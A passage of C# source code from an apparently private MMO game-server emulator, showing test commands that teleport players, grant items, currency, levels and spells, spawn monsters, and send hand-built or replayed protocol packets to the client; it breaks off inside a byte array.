                                client.Send(stream.MapStatusCreate(client.Map.ID, client.Map.ID, (ulong)(1U << int.Parse(data[1]))));
                            }
                            break;
                        }
                    case "pkp":
                        {
                            client.Player.PKPoints = ushort.Parse(data[1]);
                            break;
                        }
                    case "ctf":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int x = 0; x < 30; x++)
                                {
                                    stream.CaptureTheFlagUpdateCreate((MsgCaptureTheFlagUpdate.Mode)x, 3, 1);
                                    //326,447
                                    stream.AddX2LocationCaptureTheFlagUpdate(326, 447);
                                    stream.CaptureTheFlagUpdateFinalize();
                                    client.Send(stream);
                                }
                            }
                            break;
                        }
                    case "leaguepoints":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                client.Send(stream.CreateGoldLeaguePoint(new MsgGoldLeaguePoint.GoldLeaguePoint()
                                {
                                    Points = uint.Parse(data[1]),
                                    HistoryPoints = uint.Parse(data[2])
                                }));
                            }
                            break;
                        }
                    case "searchguard":
                        {
                            foreach (var mob in client.Map.View.GetAllMapRoles(Role.MapObjectType.Monster))
                            {
                                if (mob.X == client.Player.X && mob.Y == client.Player.Y)
                                {
                                    client.SendSysMesage("Location Spawn --> " + (mob as Game.MsgMonster.MonsterRole).LocationSpawn, ChatMode.System, MsgColor.red);
                                }
                            }
                            break;
                        }
                    case "unionrank":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                client.Player.SendUpdate(stream, uint.Parse(data[1]), MsgUpdate.DataType.UnionRank);
                                //     dwparam1 = 0, UID = this.UID, Rank = StrRank,dwparam3 = 2, dwparam5 =1
                                client.Player.Send(stream.CreateLeagueMainRank(new MsgLeagueMainRank.MsgUnionRank()
                                {
                                    UID = client.Player.UID,
                                    Name = data[2],
                                    Type = MsgLeagueMainRank.RankType.Kingdom

                                }));
                            }

                            break;
                        }
                    case "robopt":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Send(stream.CreateLeagueRobOpt(new MsgLeagueRobOpt.RobOpt()
                                {
                                    Type = uint.Parse(data[1])
                                     ,
                                    Unknown2 = uint.Parse(data[2])
                                     ,
                                    ID = uint.Parse(data[3])
                                     ,
                                    Name = data[4],
                                }));
                            }

                            break;
                        }
                    case "gui":
                        {
                            TestGui = ushort.Parse(data[1]);
                            break;
                        }
                    case "sound":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendString(stream, MsgStringPacket.StringID.Sound, false, "sound/wind.wav", "1");

                            }
                            break;
                        }
                    case "sound2":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendString(stream, MsgStringPacket.StringID.Sound, false, "sound/fc2.wav", "1");

                            }
                            break;
                        }
                    case "attackspell":
                        {// zf2-e263
                            //foreach (var spell in Database.Server.Magic)
                            {

                                foreach (var monster in client.Player.View.Roles(Role.MapObjectType.Monster))
                                {
                                    //for (ushort x = 12000; x < 12600; x += 10)
                                    {
                                        //    for (ushort x = 12830; x <= 13090; x+= 10)
                                        {
                                            using (var rec = new ServerSockets.RecycledPacket())
                                            {
                                                var stream = rec.GetStream();

                                                //    client.MySpells.Add(stream, x);
                                                MsgSpellAnimation animation = new MsgSpellAnimation(monster.UID, 0, client.Player.X, client.Player.Y, ushort.Parse(data[1]), /*ushort.Parse(data[2])*/0, /*byte.Parse(data[3])*/0, 0);
                                                var objat = new MsgSpellAnimation.SpellObj(client.Player.UID, 100, (MsgAttackPacket.AttackEffect)(1 << ushort.Parse(data[2])));//.None);

                                                //objat.Hit = 0;
                                                animation.Targets.Enqueue(objat);

                                                animation.SetStream(stream);
                                                animation.JustMe(client);

                                                //                                                System.Threading.Thread.Sleep(400);






                                            }
                                        }
                                    }
                                    // Console.WriteLine(spell.Key);
                                    //   System.Threading.Thread.Sleep(500);
                                    /*  animation.Create();
                                      unsafe
                                      {
                                          foreach (var packet in animation.GetPackets())
                                          {
                                              fixed (byte* ptr = packet)
                                                  client.Send(ptr);
                                          }
                                      }*/
                                    break;
                                }
                            }
                            break;
                        }
                    case "attacknormal":
                        {
                            foreach (var monster in client.Player.View.Roles(Role.MapObjectType.Monster))
                            {


                                //for (int x = 50; x < 60; x++)
                                {

                                    InteractQuery attack = new InteractQuery();
                                    attack.UID = monster.UID;
                                    attack.AtkType = (MsgAttackPacket.AttackID)ushort.Parse(data[1]);
                                    // attack.SpellID = 12070;
                                    attack.Damage = 1;
                                    attack.OpponentUID = client.Player.UID;
                                    attack.X = client.Player.X;
                                    attack.Y = client.Player.Y;
                                    // attack.ResponseDamage = 12070;
                                    using (var rec = new ServerSockets.RecycledPacket())
                                    {
                                        var stream = rec.GetStream();
                                        client.Player.View.SendView(stream.InteractionCreate(&attack), true);
                                    }
                                }
                                break;
                            }
                            break;
                        }
                    case "ef":
                        {
                            Game.MsgServer.MsgMovement.eeffect = int.Parse(data[1]);
                            break;
                        }
                    case "boss":
                        {
                            if (client.Map.ContainMobID(uint.Parse(data[1])))
                                break;
                            using (var rec = new ServerSockets.RecycledPacket())
                                Database.Server.AddMapMonster(rec.GetStream(), client.Map, uint.Parse(data[1]), client.Player.X, client.Player.Y, ushort.Parse(data[2]), ushort.Parse(data[3]), byte.Parse(data[4]));
                            break;
                        }
                    case "testeffects":
                        {
                            var array = Database.DBEffects.Effecte.Values.ToArray();
                            foreach (var effe in array)
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.Player.SendString(stream, MsgStringPacket.StringID.Effect, true, effe.ToString());
                                }
                                //                System.Threading.Thread.Sleep(200);
                            }
                            /*   for (int x = int.Parse(data[1]); x < int.Parse(data[2]); x++)
                               {
                                   using (var rec = new ServerSockets.RecycledPacket())
                                   {
                                       var stream = rec.GetStream();
                                       client.Player.SendString(stream,MsgStringPacket.StringID.Effect, true, array[x]);
                                   }
                               }*/
                            break;
                        }
                    case "teleback":
                        {
                            client.TeleportCallBack();
                            break;
                        }
                    case "map":
                        {
                            client.SendSysMesage("MapID = " + client.Player.Map, ChatMode.System);
                            break;
                        }
                    case "studypoints":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Player.SubClass.AddStudyPoints(client, ushort.Parse(data[1]), rec.GetStream());
                            break;
                        }
                    case "expball":
                        {
                            client.GainExpBall(double.Parse(data[1]), true, Role.Flags.ExperienceEffect.angelwing);
                            break;
                        }
                    case "string_effect":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendString(stream, MsgStringPacket.StringID.Effect, true, data[1]);
                            }
                            break;
                        }
                    case "string_effect3":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                // for (int x = 0; x < 100; x++)
                                {
                                    Game.MsgServer.MsgStringPacket packet = new Game.MsgServer.MsgStringPacket();
                                    packet.ID = (MsgStringPacket.StringID)ushort.Parse(data[1]);
                                    packet.X = ushort.Parse(data[2]);
                                    packet.Y = ushort.Parse(data[3]);
                                    packet.Strings = new string[1] { "movego" }; ;
                                    client.Send(stream.StringPacketCreate(packet));
                                }
                            }
                            break;
                        }
                    case "string_effect2":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                Game.MsgNpc.Npc npc = new MsgNpc.Npc();

                                stream.InitWriter();

                                stream.Write(1);
                                stream.Write(0);
                                stream.Write(0);
                                stream.Write(0);
                                stream.Write(ushort.Parse(data[1]));
                                stream.Write(ushort.Parse(data[2]));
                                stream.Write((ushort)385);
                                stream.Write((ushort)26);
                                stream.Write((uint)0);
                                stream.Write((uint)0);
                                stream.Write((uint)0);
                                stream.Write(" ");
                                stream.Finalize(Game.GamePackets.SobNpcs);

                                client.Send(stream);
                                client.Player.SendString(stream, MsgStringPacket.StringID.Effect, 1, true, data[3]);

                                /*System.Threading.Thread.Sleep(3000);
                                var action = new ActionQuery()
                                {
                                     Type = ActionType.RemoveEntity,
                                     ObjId =1
                                };
                               client.Send(stream.ActionCreate(&action));*/


                            }
                            break;
                        }
                    case "gh":
                        {
                            byte[] pp = new byte[]
                            {
                                0x02,0x00,0x00,0x00
,0x19,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x00
,0x2E,0x00,0x00,0x00,0x35,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x28,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                            };
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.InitWriter();
                                stream.Write(Environment.TickCount);
                                stream.Write(client.Player.UID);
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);
                                stream.Finalize(10017);
                                client.Send(stream);
                            }
                            byte[] pp2 = new byte[]
                            {
                                0x01,0x00,0x00,0x00,0x35,0x00,0x00,0x00
,0x00,0x01,0x00,0x00,0x28,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0,0,0,0
                            };
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.InitWriter();

                                stream.Write(client.Player.UID);
                                for (int x = 0; x < pp2.Length; x++)
                                    stream.Write((byte)pp2[x]);
                                stream.Finalize(2075);
                                client.Send(stream);
                            }
                            break;
                        }
                    case "xp":
                        {
                            client.Player.AddFlag(MsgUpdate.Flags.XPList, 20, true);
                            break;
                        }
                    case "addflag":
                        {
                            client.Player.AddFlag((MsgUpdate.Flags)int.Parse(data[1]), 10, true, 0, 50, 39);
                            break;
                        }
                    case "remflag":
                        {
                            client.Player.RemoveFlag((MsgUpdate.Flags)int.Parse(data[1]));
                            break;
                        }
                    case "level":
                        {
                            byte amount = 0;
                            if (byte.TryParse(data[1], out amount))
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.UpdateLevel(stream, amount, true);
                                }
                            }
                            break;
                        }
                    case "money":
                        {
                            long amount = 0;
                            if (long.TryParse(data[1], out amount))
                            {
                                client.Player.Money = amount;
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.Player.SendUpdate(stream, client.Player.Money, MsgUpdate.DataType.Money);
                                }
                            }
                            break;
                        }
                    case "cps":
                        {
                            uint amount = 0;
                            if (uint.TryParse(data[1], out amount))
                            {
                                client.Player.ConquerPoints = amount;

                            }
                            break;
                        }
                    case "warpoints":
                        {
                            uint amount = 0;
                            if (uint.TryParse(data[1], out amount))
                            {
                                client.Player.WarPoints = amount;

                            }
                            break;
                        }
                    case "presentflag":
                        {
                            Console.WriteLine("");
                            MyConsole.WriteLine(client.Map.cells[client.Player.X, client.Player.Y].ToString());
                            break;
                        }
                    case "remspell":
                        {
                            ushort ID = 0;
                            if (!ushort.TryParse(data[1], out ID))
                            {
                                client.SendSysMesage("Invlid spell ID !");
                                break;
                            }
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.MySpells.Remove(ID, rec.GetStream());
                            break;
                        }
                    case "spell":
                        {
                            ushort ID = 0;
                            if (!ushort.TryParse(data[1], out ID))
                            {
                                client.SendSysMesage("Invlid spell ID !");
                                break;
                            }
                            byte level = 0;
                            if (!byte.TryParse(data[2], out level))
                            {
                                client.SendSysMesage("Invlid spell Level ! ");
                                break;
                            }
                            byte levelHu = 0;
                            if (data.Length >= 3)
                            {
                                if (!byte.TryParse(data[3], out levelHu))
                                {
                                    client.SendSysMesage("Invlid spell Level Souls ! ");
                                    break;
                                }
                            }
                            int Experience = 0;
                            if (!int.TryParse(data[4], out Experience))
                            {
                                client.SendSysMesage("Invlid spell Experience ! ");
                                break;
                            }

                            using (var rec = new ServerSockets.RecycledPacket())
                                client.MySpells.Add(rec.GetStream(), ID, level, levelHu, 0, Experience);
                            break;
                        }
                    case "prof":
                        {
                            ushort ID = 0;
                            if (!ushort.TryParse(data[1], out ID))
                            {
                                client.SendSysMesage("Invlid prof ID !");
                                break;
                            }
                            byte level = 0;
                            if (!byte.TryParse(data[2], out level))
                            {
                                client.SendSysMesage("Invlid prof Level ! ");
                                break;
                            }
                            uint Experience = 0;
                            if (!uint.TryParse(data[3], out Experience))
                            {
                                client.SendSysMesage("Invlid prof Experience ! ");
                                break;
                            }
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.MyProfs.Add(rec.GetStream(), ID, level, Experience);
                            break;
                        }
                    case "clear":
                    case "clearinventory":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Inventory.Clear(rec.GetStream());
                            break;
                        }
                    case "hhhj":
                        {
                            client.SendSysMesage("Congrats! Rm2015`s FantasyKnife has climbed to No.38 place on the Perfection Ranking. [Link I want to get on the list###1 345]", ChatMode.TopLeftSystem);
                            break;
                        }
                    case "tele":
                        {
                            /*string Maps = "";
                             foreach (var amap in Role.GameMap.MapContents)
                            {
                                  Console.Write(amap.Key + " / ");
                                Maps += amap.Key;
                                Maps += Environment.NewLine;

                                 System.IO.StreamWriter SW = new System.IO.StreamWriter(@"C:\PacketSniffing\PMaps" + 1 + ".txt", true);
                                  SW.WriteLine(Maps);
                                  SW.Flush();
                                  SW.Close();
                            }*/
                            client.TerainMask = 0;
                            uint mapid = 0;
                            if (!uint.TryParse(data[1], out mapid))
                            {
                                client.SendSysMesage("Invlid Map ID !");
                                break;
                            }
                            ushort X = 0;
                            if (!ushort.TryParse(data[2], out X))
                            {
                                client.SendSysMesage("Invlid X !");
                                break;
                            }
                            ushort Y = 0;
                            if (!ushort.TryParse(data[3], out Y))
                            {
                                client.SendSysMesage("Invlid Y !");
                                break;
                            } 
                            client.Teleport(X, Y, mapid);

                            break;
                        }
                    case "effectfloor":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                //   for (uint x = 700; x < 750; x++)
                                {
                                    MsgServer.MsgGameItem item = new MsgServer.MsgGameItem();
                                    item.Color = (Role.Flags.Color)2;
                                    item.ITEM_ID = uint.Parse(data[1]);//1182;
                                    MsgFloorItem.MsgItem DropItem = new MsgFloorItem.MsgItem(item, client.Player.X, client.Player.Y, MsgFloorItem.MsgItem.ItemType.Effect, 0, 0, client.Player.Map
                                           , 0, false, client.Map, 4);

                                    if (client.Map.EnqueueItem(DropItem))
                                        DropItem.SendAll(stream, MsgFloorItem.MsgDropID.Effect);
                                }
                            }
                            break;
                        }
                    case "tele2":
                        {
                            uint mapid = 0;
                            if (!uint.TryParse(data[1], out mapid))
                            {
                                client.SendSysMesage("Invlid Map ID !");
                                break;
                            }
                            ushort X = 0;
                            if (!ushort.TryParse(data[2], out X))
                            {
                                client.SendSysMesage("Invlid X !");
                                break;
                            }
                            ushort Y = 0;
                            if (!ushort.TryParse(data[3], out Y))
                            {
                                client.SendSysMesage("Invlid Y !");
                                break;
                            }
                            foreach (var map in Database.Server.ServerMaps.Values)
                            {
                                mapid = map.ID;
                                //Console.WriteLine(map.ID);
                                ActionQuery action = new ActionQuery()
                                {
                                    ObjId = client.Player.UID,
                                    Type = ActionType.Teleport,
                                    dwParam = mapid,
                                    wParam1 = X,
                                    wParam2 = Y,
                                    dwParam3 = mapid
                                };
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    client.Send(rec.GetStream().ActionCreate(&action));
                                    client.Send(rec.GetStream().MapStatusCreate(mapid, mapid, 8));
                                }
                                System.Threading.Thread.Sleep(1000);
                            }
                            break;
                        }
                    case "removegarment":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Player.RemoveSpecialGarment(rec.GetStream());



                            break;
                        }

                    case "loadpackets":
                        {
                            Database.ServerDatabase.LoadDBPackets();

                            break;
                        }
                    case "sendpackets":
                        {
                            int ax = 0;
                            foreach (var packet in Program.LoadPackets)
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    ushort PacketID = BitConverter.ToUInt16(packet, 2);
                                    /* if (PacketID == 10017)
                                     {
                                         stream.InitWriter();
                                         stream.Write(Environment.TickCount);
                                         stream.Write(client.Player.UID);
                                         for (int x = 12; x < packet.Length - 8; x++)
                                         {
                                             stream.Write((byte)packet[x]);
                                         }
                                         stream.Finalize(10017);
                                         client.Send(stream);
                                         MyConsole.PrintPacketAdvanced(stream.Memory, stream.Size);
                                     }*/
                                    /*     stream.InitWriter();
                                         for (int x = 4; x < packet.Length - 4 - 8; x++)
                                         {
                                             stream.Write((byte)packet[x]);
                                         }
                                         stream.Finalize(PacketID);

                                         client.Send(stream);
                                         */
                                    if (PacketID == 1101 || PacketID == 1105)
                                    {
                                        if (PacketID == 1105)
                                        {

                                            stream.InitWriter();
                                            for (int x = 4; x < packet.Length - 4 - 8; x++)
                                            {
                                                stream.Write((byte)packet[x]);
                                            }
                                            stream.Finalize(PacketID);

                                            int size = stream.Size;
                                            stream.Seek(12);
                                            ushort SpelliD = stream.ReadUInt16();

                                            stream.Seek(stream.Size);
                                            if (SpelliD == 12990)
                                            {
                                                if (ax == 0)
                                                {
                                                    ax += 1;
                                                    continue;
                                                }
                                                ax++;
                                                client.Send(stream);
                                                System.Threading.Thread.Sleep(200);
                                                MyConsole.PrintPacketAdvanced(stream.Memory, stream.Size);
                                                //Console.WriteLine(PacketID);
                                            }
                                        }
                                        else
                                        {
                                            if (PacketID == 1101)
                                            {

                                                //1530
                                                stream.InitWriter();
                                                for (int x = 4; x < packet.Length - 4 - 8; x++)
                                                {
                                                    stream.Write((byte)packet[x]);
                                                }
                                                stream.Finalize(PacketID);

                                                int size = stream.Size;
                                                stream.Seek(12);
                                                ushort SpelliD = stream.ReadUInt16();
                                                stream.Seek(stream.Size);
                                                if (SpelliD == 1530)
                                                {

                                                    ax++;
                                                    if (ax == 4)
                                                        continue;
                                                    client.Send(stream);
                                                    System.Threading.Thread.Sleep(200);
                                                    MyConsole.PrintPacketAdvanced(stream.Memory, stream.Size);
                                                    //Console.WriteLine(PacketID);
                                                }
                                            }
                                        }
                                    }
                                }

                            }
                            break;
                        }
                    case "addgarment":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Player.AddSpecialGarment(rec.GetStream(), uint.Parse(data[1]));
                            break;
                        }
                    case "addpika":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.AddSpecialitemR(stream, 410289);
                                client.Player.AddSpecialitemL(stream, 420289);
                                if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.ScrenSword))
                                    client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.ScrenSword, 4);
                                if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.FastBlader))
                                    client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.FastBlader , 4);
                            }
                            break;
                        }
                    case "repika":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.RemoveSpecialitem(stream);
                                client.Player.RemoveSpecialitem1(stream);
                                if (client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.ScrenSword))
                                    client.MySpells.Remove((ushort)Role.Flags.SpellID.ScrenSword, stream);
                                if (client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.FastBlader))
                                    client.MySpells.Remove((ushort)Role.Flags.SpellID.FastBlader, stream);

                            }
                            break;
                        }
                    case "remgarment":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Player.RemoveSpecialGarment(rec.GetStream());
                            break;
                        }
                    case "itemm":
                        {
                            uint ID = 0;
                            if (!uint.TryParse(data[1], out ID))
                            {
                                client.SendSysMesage("Invlid item ID !");
                                break;
                            }
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Inventory.AddItemWitchStack(ID, 0, 10, rec.GetStream(), false);

                            break;
                        }
                    case "epkon":
                        {
                            Game.MsgTournaments.MsgSchedules.ElitePkTournament.Start();

                            foreach (var clients in Database.Server.GamePoll.Values)
                            {
                                if (clients.Team != null)
                                    Game.MsgTournaments.MsgSchedules.ElitePkTournament.SignUp(clients);
                            }
                            break;
                        }
                    case "item":
                        {
                            uint ID = 0;
                            if (!uint.TryParse(data[1], out ID))
                            {
                                client.SendSysMesage("Invlid item ID !");
                                break;
                            }
                            byte plus = 0;
                            if (!byte.TryParse(data[2], out plus))
                            {
                                client.SendSysMesage("Invlid item plus !");
                                break;
                            }
                            byte bless = 0;
                            if (!byte.TryParse(data[3], out bless))
                            {
                                client.SendSysMesage("Invlid item Enchant !");
                                break;
                            }
                            byte enchant = 0;
                            if (!byte.TryParse(data[4], out enchant))
                            {
                                client.SendSysMesage("Invlid item Enchant !");
                                break;
                            }
                            byte sockone = 0;
                            if (!byte.TryParse(data[5], out sockone))
                            {
                                client.SendSysMesage("Invlid item Socket One !");
                                break;
                            }
                            byte socktwo = 0;
                            if (!byte.TryParse(data[6], out socktwo))
                            {
                                client.SendSysMesage("Invlid item Socket Two !");
                                break;
                            }
                            byte count = 1;
                            if (data.Length > 7)
                            {
                                if (!byte.TryParse(data[7], out count))
                                {
                                    client.SendSysMesage("Invlid item count !");
                                    break;
                                }
                            }
                            byte Effect = 0;
                            if (data.Length > 8)
                            {
                                if (!byte.TryParse(data[8], out Effect))
                                {
                                    client.SendSysMesage("Invlid Effect Type !");
                                    break;
                                }
                            }
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                client.Inventory.Add(rec.GetStream(), ID, count, plus, bless, enchant, (Role.Flags.Gem)sockone, (Role.Flags.Gem)socktwo, false, (Role.Flags.ItemEffect)Effect);
                            }
                            break;
                        }
                    case "updatestarsitem":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                foreach (var item in client.Inventory.ClientItems.Values)
                                {
                                    if (item.ITEM_ID == uint.Parse(data[1]))
                                    {
                                        item.PerfectionLevel = uint.Parse(data[2]);
                                        item.Mode = Role.Flags.ItemMode.Update;
                                        item.Send(client, rec.GetStream());
                                        break;
                                    }

                                }
                            }
                            break;
                        }
                    case "bcps":
                        {
                            client.Player.BoundConquerPoints = int.Parse(data[1]);
                            break;
                        }
                    case "lotus":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                Database.Server.AddFloor(stream, client.Map, Game.MsgFloorItem.MsgItemPacket.FlameLotus, client.Player.X, client.Player.Y, 1, Database.Server.Magic[12370][1], client, client.Player.GuildID, client.Player.UID, 0, "AuroraLotus", true);
                            }
                            break;
                        }
                    case "additemstack":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Inventory.AddItemWitchStack(uint.Parse(data[1]), 0, ushort.Parse(data[2]), stream);
                            }
                            break;
                        }
                    case "remitemstack":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Inventory.RemoveStackItem(uint.Parse(data[1]), ushort.Parse(data[2]), stream);
                            }
                            break;
                        }
                    case "exchange2":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                MsgExchangeShop.ExchangeShop.Item[] items = new MsgExchangeShop.ExchangeShop.Item[1];
                                items[0] = new MsgExchangeShop.ExchangeShop.Item();
                                items[0].ID = client.Player.UID;

                                client.Send(stream.CreateExchangeShop(new MsgExchangeShop.ExchangeShop()
                                {
                                    DwParam1 = 19424,
                                    DwParam2 = uint.Parse(data[1]),
                                    DwParam3 = uint.Parse(data[2]),
                                    DwParam4 = uint.Parse(data[3])//timer
                                }));


                            }

                            break;
                        }
                    case "exchange3":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                byte[] pp = new byte[]
                     {
                         0x08 ,0xE0 ,0x97 ,0x01 ,0x10 ,0x01 ,0x18 ,0x01 ,0x20 ,0x0A ,0x2A ,0x07 ,0x08 ,0xEE ,0xCA ,0x8E ,0x03 ,0x10 ,0x0A

                     }; stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);
                                stream.Finalize(2441);

                                MsgExchangeShop.ExchangeShop test;
                                stream.GetExchangeShop(out test);

                                test.Items[0].ID = client.Player.UID;
                                test.DwParam4 = uint.Parse(data[3]);
                                client.Send(stream.CreateExchangeShop(test));
                            }
                            break;
                        }

                    case "ss":
                        {
                            //39 timer secounds
                            byte[] pp = new byte[]
                            {
                              0xCE,0x6B,0xF2,0x05,0x68,0x00,0x00,0x00,0x3B,0x26,0x06,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x21
,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x63,0x01,0x66,0x01,0x00,0x00,0x07,0x64,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF
,0x01,0x00,0x00,0x36, 0x65, 0x44,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x04,0x08,0x50,0x68,0x65,0x61,0x73,0x61
,0x6E,0x74,0x00,0x00,0x00
                            };
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);
                                stream.Finalize(10014);
                                MyConsole.PrintPacketAdvanced(stream.Memory, stream.Size);
                                client.Send(stream);


                            }
                            break;
                        }
              
                    case "fftest":
                        {
                            ushort x1 = ushort.Parse(data[1]);
                            ushort y1 = ushort.Parse(data[2]);
                            ushort x2 = ushort.Parse(data[3]);
                            ushort y2 = ushort.Parse(data[4]);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                byte[] pp = new byte[]
                        {
                            0xE3,0xBC,0x82,0x00,0xFC,0xBB,0x0D,0x00,0xFA,0x05,0x00,0x00
,0x3C,0x01,0x9A,0x01,0x00,0x00,0x0A,0x00,0x00,0x00,0x00,0x0E,0x89,0x45,0x0F,0x00
,0x02,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3B,0x01,0x9B
,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        };

                                int size = stream.Size;

                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);


                                stream.Finalize(1101);

                                stream.Seek(16);
                                stream.Write(x1);
                                stream.Write(y1);
                                stream.Seek(60);
                                stream.Write(x2);
                                stream.Write(y2);

                                stream.Seek(size);

                                client.Send(stream);


                                pp = new byte[]
                          {
                              0xFC,0xBB,0x0D,0x00,0x3B,0x01,0x9B,0x01,0xBE,0x32,0x00,0x00
,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00

